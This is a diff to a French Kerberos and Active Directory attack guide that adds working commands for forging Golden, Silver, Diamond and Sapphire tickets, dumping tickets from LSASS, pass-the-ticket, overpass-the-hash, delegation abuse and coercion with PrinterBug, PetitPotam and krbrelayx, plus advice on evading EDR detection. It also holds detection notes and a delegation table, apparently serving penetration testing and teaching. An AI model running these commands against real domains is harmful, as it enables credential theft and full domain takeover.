@@ -84,7 +84,7 @@ Le **timestamp** dans `PA-ENC-TIMESTAMP` contribue aussi à limiter le **rejeu**
 Si tout est valide, le KDC répond avec un `KRB_AS_REP` contenant deux éléments distincts, chiffrés différemment :
 
 - Une **clé de session** et des métadonnées, chiffrées avec la clé de long terme du client (c'est cette portion que l'ASREPRoast tente de casser)
-- Le **TGT** lui-même, chiffré avec la clé du `krbtgt`, donc totalement illisible pour le client qui le reçoit, il ne fait que le stocker et le representer plus tard
+- Le **TGT** lui-même, chiffré avec la clé du `krbtgt`, donc totalement illisible pour le client qui le reçoit, il ne fait que le stocker et le représenter plus tard
 
 ![AS-REQ / AS-REP](/images/play_kerberos/PreAuth.png)
 
@@ -147,17 +147,34 @@ Cette distinction a un impact opérationnel direct : un ASREPRoast ou un Kerbero
 
 Quand plusieurs domaines ou forêts sont liés par une relation d'approbation (trust), Kerberos étend son fonctionnement via des **tickets de référence** (referral tickets) : un TGT valide dans le domaine A peut être présenté au KDC du domaine B approuvé, qui délivre en retour un TGT inter-domaine permettant ensuite de demander des TGS dans le domaine B. Ce mécanisme, hors du périmètre détaillé de ce document, est la porte d'entrée des attaques de mouvement latéral inter-domaines et inter-forêts (abus de SID history, Golden Ticket inter-royaume).
 
-### 11. PKINIT
+### 11-A. PKINIT
 
-Référence : [The Hacker Recipes : UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) / [dirkjanm.io : NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+Référence : [Walking The Dog Kerberos](https://www.incendium.rocks/posts/Walking-The-Dog-Kerberos/#pkinit) / [Kerberos Explained](https://thattotallyrealmyth.gitbook.io/kerberos-explained/advanced-concepts/pkinit)
 
 **PKINIT** (Public Key Cryptography for INITial authentication) est une extension de Kerberos qui remplace la pré-authentification symétrique classique (`PA-ENC-TIMESTAMP`, basée sur un mot de passe) par une preuve asymétrique basée sur un certificat X.509 : le client signe sa requête avec sa clé privée plutôt que de chiffrer un timestamp avec une clé dérivée d'un mot de passe. Le KDC, en vérifiant cette signature contre la chaîne de confiance de la CA du domaine, délivre un TGT normal, exactement comme pour une authentification par mot de passe.
 
 C'est le mécanisme exploité dans les attaques ADCS (ESC1, ESC3, ESC7, ESC8, etc.) : une fois un certificat valide obtenu au nom d'une identité cible, un outil comme `certipy-ad auth` effectue cette authentification PKINIT pour obtenir un TGT.
 
-**Cas particulier de l'UnPAC-the-Hash :** dans certaines configurations et certains échanges PKINIT, le KDC peut inclure une structure `PAC_CREDENTIAL_INFO` contenant le hash NT du compte, chiffrée avec la clé de session du TGT. Récupérer cette structure nécessite généralement une requête **User-to-User (U2U)** et les conditions cryptographiques appropriées. L'obtention d'un TGT par PKINIT et l'extraction d'un hash NT sont donc deux résultats distincts : `certipy-ad auth` peut obtenir le TGT sans que l'UnPAC-the-Hash soit automatiquement disponible dans tous les environnements.
+L'extraction éventuelle du hash NT au cours de certains échanges PKINIT est détaillée dans la section **UnPAC-the-Hash** ci-dessous. Il faut distinguer les deux résultats : obtenir un TGT par PKINIT ne garantit pas que le hash NT sera récupérable.
 
----
+### 11-B. UnPAC-the-Hash
+
+Référence : [The Hacker Recipes : UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) / [Kerberos Explained : UnPAC the hash](https://thattotallyrealmyth.gitbook.io/kerberos-explained/advanced-concepts/pkinit#unpac-the-hash)
+
+**UnPAC-the-Hash** exploite certains échanges PKINIT pour récupérer le hash NT d'un compte à partir des informations d'identification incluses dans son PAC. Dans les conditions appropriées, le KDC ajoute une structure `PAC_CREDENTIAL_INFO` au ticket ; cette structure contient le hash NT du compte et est chiffrée avec la clé de session du TGT obtenu par PKINIT.
+
+L'extraction ne consiste donc pas à casser le certificat ou le TGT. Elle nécessite généralement une requête **User-to-User (U2U)** afin d'obtenir le contexte cryptographique permettant de déchiffrer `PAC_CREDENTIAL_INFO`. L'attaquant doit disposer d'un certificat utilisable pour l'authentification PKINIT et cibler le compte correspondant à ce certificat.
+
+**Déroulement conceptuel :**
+
+1. Obtenir un certificat valide permettant de s'authentifier comme le compte cible, par exemple via une mauvaise configuration ADCS.
+2. Effectuer une authentification PKINIT et obtenir un TGT légitime.
+3. Utiliser U2U pour récupérer le PAC contenant `PAC_CREDENTIAL_INFO`.
+4. Déchiffrer cette structure avec la clé de session et extraire le hash NT.
+
+> **Limite importante :** PKINIT peut réussir et fournir un TGT sans que l'UnPAC-the-Hash soit exploitable. La présence de `PAC_CREDENTIAL_INFO`, le type de certificat, les extensions Kerberos négociées et les protections du domaine déterminent le résultat final.
+
+![PKINIT + UnPAC-the-Hash](/images/play_kerberos/Pku2u.png)
 
 ## II. Attaques par Cassage Offline
 
@@ -256,15 +273,39 @@ Référence : [ired.team : Kerberos Golden Tickets](https://www.ired.team/offens
 
 **Exploitation :**
 
+**Impacket (Linux) :**
+
 ```bash
 impacket-ticketer -nthash '<hash NT du krbtgt>' \
   -domain-sid 'S-1-5-21-...' -domain 'domain.local' \
   -user-id 500 administrator
 
-export KRB5CCNAME='administrator.ccache'
+export KRB5CCNAME=administrator.ccache
+impacket-psexec domain.local/administrator@dc.domain.local -k -no-pass
 ```
 
-`ticketer.py` génère un TGT au format `.ccache`. Il peut ensuite être utilisé par les outils Kerberos qui lisent la variable `KRB5CCNAME`, au lieu d'être injecté directement dans la session comme avec Mimikatz.
+**Rubeus (Windows) :**
+
+```bash
+# Forge et injection directe du Golden Ticket
+Rubeus.exe golden /rc4:<hash NT du krbtgt> /domain:domain.local \
+  /sid:S-1-5-21-... /user:administrator /id:500 /groups:512 /ptt
+
+# Avec une cle AES256 (plus discret)
+Rubeus.exe golden /aes256:<cle AES du krbtgt> /domain:domain.local \
+  /sid:S-1-5-21-... /user:administrator /id:500 /groups:512 /ptt /opsec
+```
+
+**Mimikatz (Windows) :**
+
+```bash
+# Recuperation du hash krbtgt depuis LSASS (sur le DC)
+mimikatz # lsadump::lsa /patch
+
+# Forge et injection
+mimikatz # kerberos::golden /user:administrator /domain:domain.local \
+  /sid:S-1-5-21-... /krbtgt:<hash NT du krbtgt> /id:500 /ptt
+```
 
 **Impact :** contrôle total et persistant du domaine, jusqu'au changement du mot de passe `krbtgt` (deux fois, pour invalider aussi la version N-1 conservée par Windows pour la continuité de service).
 
@@ -280,9 +321,30 @@ Référence : [ired.team : Kerberos Silver Tickets](https://www.ired.team/offens
 
 **Exploitation :**
 
+**Mimikatz (Windows) :**
+
 ```bash
 mimikatz # kerberos::golden /sid:S-1-5-21-... /domain:domain.local \
-  /ptt /target:service.domain.local /service:cifs /rc4:<hash du compte de service> /user:administrator
+  /ptt /target:service.domain.local /service:cifs \
+  /rc4:<hash du compte de service> /user:administrator
+```
+
+**Rubeus (Windows) :**
+
+```bash
+Rubeus.exe silver /rc4:<hash du compte de service> /domain:domain.local \
+  /sid:S-1-5-21-... /user:administrator /service:cifs/target.domain.local /ptt
+```
+
+**Impacket (Linux) :**
+
+```bash
+impacket-ticketer -nthash '<hash du compte de service>' \
+  -domain-sid 'S-1-5-21-...' -domain 'domain.local' \
+  -spn 'cifs/target.domain.local' administrator
+
+export KRB5CCNAME=administrator.ccache
+impacket-smbexec domain.local/administrator@target.domain.local -k -no-pass
 ```
 
 **Impact :** accès complet au service ciblé (souvent CIFS pour un accès fichiers complet, ou HOST pour une exécution de commande via des outils d'admin distant), avec l'identité choisie.
@@ -301,13 +363,28 @@ Référence : [The Hacker Recipes : Diamond tickets](https://www.thehacker.recip
 
 **Sapphire Ticket :** va encore plus loin dans le réalisme. Plutôt que de modifier manuellement le PAC d'un ticket obtenu pour soi-même, l'attaquant utilise le mécanisme **S4U2Self + U2U** (U2U étant le même principe de chiffrement que celui de l'UnPAC-the-Hash en section 11, mais combiné ici avec S4U2Self pour cibler un autre compte) pour récupérer le PAC d'un compte réellement privilégié, puis l'insère tel quel dans son propre ticket. Le résultat est un assemblage d'éléments entièrement légitimes (un vrai PAC d'un vrai compte admin, sur un vrai ticket obtenu normalement), ce qui en fait la variante la plus difficile à détecter des quatre.
 
-**Exploitation (Diamond, via Rubeus) :**
+**Exploitation - Diamond Ticket (Rubeus) :**
 
 ```bash
 Rubeus.exe diamond /domain:domain.local /user:standarduser /password:'Password123' \
-  /dc:dc01.domain.local /enctype:AES256 /krbkey:<clé AES du krbtgt> \
+  /dc:dc01.domain.local /enctype:AES256 /krbkey:<cle AES du krbtgt> \
   /ticketuser:administrator /ticketuserid:500 /groups:512
 ```
+
+**Exploitation - Sapphire Ticket (Impacket) :**
+
+```bash
+# ticketer.py avec --impersonate pour recuperer le PAC reel de la cible via S4U2Self+U2U
+impacket-ticketer -nthash '<hash NT du krbtgt>' \
+  -domain-sid 'S-1-5-21-...' -domain 'domain.local' \
+  -user-id 500 -impersonate administrator \
+  -aesKey <cle AES du krbtgt> administrator
+
+export KRB5CCNAME=administrator.ccache
+```
+
+> [!NOTE]
+> Le Sapphire Ticket necessite que l'attaquant puisse egalement effectuer un S4U2Self au nom de son propre compte (ou d'un compte de service controle), ce qui implique generalement un compte avec SPN ou les droits de delegation appropries.
 
 **Impact :** identique au Golden Ticket en portée (contrôle total via un TGT), mais bien plus difficile à détecter par les heuristiques classiques.
 
@@ -324,15 +401,57 @@ Le **Pass-the-Hash** n'est techniquement pas une attaque Kerberos : c'est une at
 
 ### 18. Pass-the-Ticket
 
+Référence : [HackTricks : Pass the Ticket](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.htmll)
+
 **Théorie :** la forme la plus directe de réutilisation, sans transformation intermédiaire. Un TGT ou un TGS volé (extrait de la mémoire LSASS d'une machine compromise, ou intercepté) est simplement réinjecté dans la session Kerberos courante de l'attaquant, exactement comme s'il avait été obtenu légitimement par ce dernier lors de son propre AS-REQ/TGS-REQ.
 
 ![Pass-the-Ticket](/images/play_kerberos/PassTheT.png)
 
 **Exploitation :**
 
+**Étape préalable - extraction des tickets depuis LSASS (Mimikatz) :**
+
+```bash
+# Exporter tous les tickets de la session courante en fichiers .kirbi
+mimikatz # sekurlsa::tickets /export
+
+# Lister les tickets en mémoire sans les exporter
+mimikatz # sekurlsa::tickets
+```
+
+**Injection d'un ticket .kirbi - Mimikatz :**
+
 ```bash
 mimikatz # kerberos::ptt ticket.kirbi
 ```
+
+**Injection d'un ticket .kirbi - Rubeus :**
+
+```bash
+# Injection dans la session courante
+Rubeus.exe ptt /ticket:ticket.kirbi
+
+# Dump de tous les tickets de la session (format base64)
+Rubeus.exe dump /nowrap
+
+# Dump d'un ticket spécifique par LUID ou service
+Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+```
+
+> [!NOTE]
+> Rubeus accepte aussi les tickets au format `.ccache` (Linux) directement via `/ticket:ticket.ccache`, ce qui facilite les mouvements entre environnements Linux et Windows.
+
+**Réutilisation d'un ticket .ccache - Impacket (Linux) :**
+
+```bash
+export KRB5CCNAME=ticket.ccache
+impacket-psexec domain.local/user@target.domain.local -k -no-pass
+impacket-smbexec domain.local/user@target.domain.local -k -no-pass
+impacket-wmiexec -k -no-pass domain.local/user@target.domain.local
+```
+
+> [!WARNING]
+> Dumper LSASS (via `sekurlsa::tickets` ou `sekurlsa::logonpasswords`) requiert **SeDebugPrivilege** (typiquement admin local ou SYSTEM) et est l'une des actions les plus détectées par les EDR modernes. Préférer Rubeus pour tout ce qui ne nécessite pas d'accès LSASS direct.
 
 **Détection :** un ticket présenté depuis une machine ou une adresse IP incohérente avec sa précédente utilisation (le champ `Client Address` d'un événement 4769 qui change brusquement pour le même compte), ou une utilisation du ticket après l'heure de déconnexion habituelle de l'utilisateur légitime.
 
@@ -340,19 +459,61 @@ mimikatz # kerberos::ptt ticket.kirbi
 
 Référence : [HackTricks : Over Pass the Hash/Pass the Key](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html)
 
-**Théorie :** contrairement au Pass-the-Ticket qui réutilise un ticket déjà émis, cette technique **génère un tout nouveau TGT légitime** en utilisant le hash NT ou la clé AES du compte comme clé de long terme pour un véritable échange AS-REQ/AS-REP, exactement comme le ferait Windows lors d'une connexion normale par mot de passe. La nuance de nommage entre les deux termes reflète le type de clé utilisé : **Pass-the-Key** désigne plus précisément l'usage d'une clé AES, tandis qu'**Overpass-the-Hash** désigne l'usage d'un hash RC4/NT, mais les deux aboutissent au même résultat via le même mécanisme.
+**Théorie :** contrairement au Pass-the-Ticket qui réutilise un ticket déjà émis, cette technique **génère un tout nouveau TGT légitime** en utilisant le hash NT ou la clé AES du compte comme clé de long terme pour un véritable échange AS-REQ/AS-REP, exactement comme le ferait Windows lors d'une connexion normale par mot de passe.
+
+La nuance de nommage entre les deux termes reflète le type de clé utilisé : **Overpass-the-Hash** désigne l'usage d'un hash RC4/NT converti en clé Kerberos RC4-HMAC, tandis que **Pass-the-Key** désigne l'usage d'une clé Kerberos AES128 ou AES256 directement.
+
+Cette distinction a une conséquence opérationnelle concrète : dans un environnement **RC4-disabled** (où le KDC n'accepte plus l'etype `0x17`), le hash NT seul ne suffit plus, il faut impérativement disposer d'une clé AES ou du mot de passe en clair pour la dériver. L'Overpass-the-Hash échoue là où le Pass-the-Key réussit.
+
+![Overpass The Hash](/images/play_kerberos/OverPassTheH.png)
 
 **Exploitation :**
 
-```bash
-Rubeus.exe asktgt /domain:domain.local /user:administrator /rc4:<hash NT> /ptt
-```
+**Impacket (Linux) — Overpass-the-Hash avec hash NT :**
 
 ```bash
-Rubeus.exe asktgt /domain:domain.local /user:administrator /aes256:<clé AES256> /ptt /opsec
+impacket-getTGT -dc-ip 10.10.10.10 domain.local/user -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+export KRB5CCNAME=user.ccache
+impacket-psexec domain.local/user@target.domain.local -k -no-pass
 ```
 
-Le flag `/opsec` est pertinent avec une clé AES : le trafic généré par Rubeus diffère légèrement d'une authentification Windows native, et ce flag ajuste certains paramètres de la requête pour s'en rapprocher, un ajustement qui perd son intérêt en RC4 puisque l'usage même de RC4 dans un domaine moderne est déjà un signal fort en soi.
+**Impacket (Linux) — Pass-the-Key avec clé AES256 :**
+
+```bash
+impacket-getTGT -dc-ip 10.10.10.10 domain.local/user -aesKey <AES256_HEX>
+export KRB5CCNAME=user.ccache
+impacket-wmiexec -k -no-pass domain.local/user@target.domain.local
+```
+
+`getTGT.py` supporte aussi `-service <SPN>` pour demander directement un ticket de service via AS-REQ, sans passer par un TGS-REQ supplémentaire.
+
+**Rubeus (Windows) — Overpass-the-Hash avec hash NT :**
+
+```bash
+Rubeus.exe asktgt /domain:domain.local /user:user /rc4:<hash NT> /ptt
+```
+
+**Rubeus (Windows) — Pass-the-Key avec clé AES256 (recommandé en production) :**
+
+```bash
+Rubeus.exe asktgt /domain:domain.local /user:user /aes256:<AES256_HEX> /ptt /opsec
+```
+
+> [!NOTE]
+> Rubeus effectue un véritable AS-REQ/AS-REP et **ne nécessite pas de droits admin** pour obtenir un TGT au nom de sa propre session. Le flag `/opsec` ajuste le trafic généré pour se rapprocher d'une authentification Windows native — pertinent uniquement avec AES ; en RC4, l'usage de l'etype `0x17` est lui-même un signal fort, `/opsec` ne change rien à ce fait.
+
+**Mimikatz (Windows) — sekurlsa::pth :**
+
+```bash
+# Overpass-the-Hash via hash NT
+sekurlsa::pth /user:user /domain:domain.local /ntlm:<hash NT> /run:cmd.exe
+
+# Pass-the-Key via clé AES256
+sekurlsa::pth /user:user /domain:domain.local /aes256:<AES256_HEX> /run:cmd.exe
+```
+
+> [!WARNING]
+> Contrairement à Rubeus, `sekurlsa::pth` **patche directement les credentials en mémoire de LSASS**, ce qui nécessite des droits admin ou SYSTEM et génère des artefacts EDR nettement plus détectables. À réserver aux contextes où Rubeus n'est pas disponible ou ne suffit pas.
 
 **Impact :** obtention d'un TGT réellement légitime (contrairement au Golden Ticket, celui-ci résulte d'un vrai échange avec le KDC), utilisable ensuite normalement pour toute demande de TGS.
 
@@ -372,13 +533,44 @@ Référence : [The Hacker Recipes : Unconstrained Delegation](https://www.thehac
 
 **Théorie :** la forme historique et la plus dangereuse. Un compte marqué `TRUSTED_FOR_DELEGATION` reçoit, en plus du TGS normal, une **copie complète du TGT** de tout utilisateur qui s'y authentifie, stockée en mémoire sur cette machine. N'importe quel utilisateur (y compris un Domain Admin) qui se connecte, même pour une opération anodine, à un service configuré ainsi laisse littéralement son TGT complet exploitable par quiconque contrôle cette machine.
 
+![Unconstrained Delegation](/images/play_kerberos/UDelegation.png)
+
 **Découverte :**
 
 ```bash
+# Avec NetExec
 nxc ldap domain.local -u user -p 'password' --trusted-for-delegation
+
+# Avec BloodHound (requete Cypher)
+MATCH (c {unconstraineddelegation:true}) RETURN c
 ```
 
-**Exploitation :** une fois administrateur local de la machine en délégation non contrainte, extraction des TGT en mémoire, ou, plus activement, **coercition** d'un compte à privilèges pour forcer son authentification vers cette machine (par exemple via `PrinterBug`/`PetitPotam` combiné à `krbrelayx`), afin de capturer son TGT sans attendre une connexion naturelle.
+**Exploitation - extraction des TGT en memoire (une fois admin local) :**
+
+```bash
+# Rubeus : surveillance continue, capture les TGT a leur arrivee
+Rubeus.exe monitor /interval:5 /nowrap
+
+# Rubeus : dump de tous les tickets actuellement en memoire
+Rubeus.exe dump /nowrap
+
+# Mimikatz : export des tickets depuis LSASS
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::ptt ticket.kirbi
+```
+
+**Exploitation - coercition active (sans attendre une connexion naturelle) :**
+
+```bash
+# PrinterBug : force un DC a s'authentifier vers notre machine
+python3 printerbug.py domain.local/user:'password'@dc.domain.local <IP_machine_delegation>
+
+# PetitPotam (sans creds si MS-EFSRPC non patche)
+python3 PetitPotam.py -u user -p 'password' -d domain.local <IP_machine_delegation> dc.domain.local
+
+# krbrelayx : capture et reuse le TGT recu
+krbrelayx.py --target ldap://dc.domain.local
+```
 
 **Impact :** vol du TGT complet d'un compte à privilèges, réutilisable ensuite en Pass-the-Ticket pour un contrôle total.
 
@@ -395,11 +587,34 @@ Référence : [The Hacker Recipes : Constrained Delegation](https://www.thehacke
 
 Le KDC vérifie, lors de la requête S4U2Proxy, que le SPN demandé figure bien dans `msDS-AllowedToDelegateTo` du compte délégant : c'est ce contrôle qui manque totalement dans la délégation non contrainte. La possibilité d'obtenir un ticket `forwardable` et d'usurper l'utilisateur dépend aussi de la configuration du compte de service et du fait que l'utilisateur cible soit délégable.
 
+![Constrained Delegation](/images/play_kerberos/CDelegation.png)
+
 **Exploitation :**
 
+**Impacket (Linux) :**
+
 ```bash
+# Obtention d'un TGS en usurpant administrator via S4U2Self + S4U2Proxy
 impacket-getST -spn 'cifs/target.domain.local' -impersonate administrator \
   domain.local/serviceaccount:'password' -dc-ip 10.10.10.10
+
+# Utilisation du TGS avec psexec
+export KRB5CCNAME=administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
+impacket-psexec domain.local/administrator@target.domain.local -k -no-pass
+```
+
+**Rubeus (Windows) :**
+
+```bash
+# S4U2Self puis S4U2Proxy en une seule commande
+Rubeus.exe s4u /user:serviceaccount /rc4:<hash NT> /domain:domain.local \
+  /impersonateuser:administrator /msdsspn:'cifs/target.domain.local' \
+  /dc:dc.domain.local /ptt
+
+# Avec une cle AES
+Rubeus.exe s4u /user:serviceaccount /aes256:<AES256_HEX> /domain:domain.local \
+  /impersonateuser:administrator /msdsspn:'cifs/target.domain.local' \
+  /dc:dc.domain.local /ptt /opsec
 ```
 
 **Impact :** obtention d'un TGS valide pour le service spécifié dans `msDS-AllowedToDelegateTo`, au nom de n'importe quel utilisateur du domaine, y compris un Domain Admin, tant que celui-ci n'est pas marqué sensible à la délégation ou membre de Protected Users.
@@ -413,6 +628,8 @@ Référence : [The Hacker Recipes : RBCD](https://www.thehacker.recipes/ad/movem
 **Théorie :** contrairement aux deux formes précédentes où c'est le **compte délégant** qui porte la configuration de délégation (via `userAccountControl` ou `msDS-AllowedToDelegateTo`), avec RBCD c'est la **ressource cible elle-même** qui désigne, via l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, quels comptes ont le droit de délégation vers elle.
 
 Cette inversion a une conséquence majeure en termes de sécurité : modifier les deux formes classiques de délégation nécessite le privilège `SeEnableDelegationPrivilege` (réservé aux Domain Admins par défaut), tandis que modifier `msDS-AllowedToActOnBehalfOfOtherIdentity` ne requiert qu'un **droit d'écriture sur cet attribut** de la machine cible. En pratique, l'attaque se déroule en trois temps : l'attaquant obtient un compte machine qu'il contrôle (soit en en créant un via `MachineAccountQuota`, soit en compromettant un compte existant), inscrit ce compte dans `msDS-AllowedToActOnBehalfOfOtherIdentity` de la cible, puis utilise S4U2Self + S4U2Proxy pour obtenir un TGS au nom d'un administrateur vers un service de la machine cible.
+
+![RBCD](/images/play_kerberos/rbcd.png)
 
 **Exploitation :**
 
@@ -429,6 +646,18 @@ impacket-getST -spn 'cifs/target.domain.local' -impersonate administrator \
 **Impact :** accès complet à la machine cible avec l'identité usurpée, tant que le compte cible n'est pas protégé contre la délégation (marqué sensible ou membre de Protected Users).
 
 **Détection :** Event **5136** montrant une modification de `msDS-AllowedToActOnBehalfOfOtherIdentity` constitue le signal principal. Il peut être corrélé avec un Event **4769** indiquant une demande S4U, mais un ticket forgé ou certains chemins d'exploitation peuvent ne pas produire exactement cette séquence. La création d'un nouveau compte machine (Event **4741**) juste avant renforce le signal.
+
+### Tableau récapitulatif des modèles de délégation
+
+| Caractéristique                                     | Délégation non contrainte (_Unconstrained_)                                                     | Délégation contrainte classique (_Constrained_)                                    | Délégation basée sur les ressources (_RBCD_)                                        |
+| --------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
+| **Portée d'accès**                                  | Tous les services du domaine auxquels le TGT de l'utilisateur peut donner accès                 | Uniquement les SPN explicitement autorisés                                         | Les services de la ressource cible, selon sa configuration                          |
+| **Lieu de configuration**                           | Compte de service ou ordinateur qui reçoit le TGT                                               | Compte de service ou ordinateur délégant                                           | Compte ordinateur ou objet de la ressource cible                                    |
+| **Attribut ou indicateur AD**                       | `userAccountControl` : indicateur `TRUSTED_FOR_DELEGATION`                                      | `msDS-AllowedToDelegateTo`                                                         | `msDS-AllowedToActOnBehalfOfOtherIdentity`                                          |
+| **Privilège ou droit requis pour la configuration** | `SeEnableDelegationPrivilege`, généralement réservé aux administrateurs du domaine              | `SeEnableDelegationPrivilege`, généralement réservé aux administrateurs du domaine | Droit d'écriture sur l'attribut de la ressource cible, souvent via une ACL déléguée |
+| **Niveau de sécurité**                              | Très faible : la compromission du service expose les TGT des utilisateurs qui s'y authentifient | Élevé : la portée est limitée, mais la configuration reste centralisée et sensible | Élevé mais décentralisé : le contrôle appartient au propriétaire de la ressource    |
+
+> **À retenir :** la délégation non contrainte est configurée sur le service qui reçoit les authentifications, la délégation contrainte limite les SPN autorisés sur ce service, tandis que la RBCD inverse le modèle en laissant la ressource cible désigner les comptes autorisés à agir en son nom.
 
 ---
 
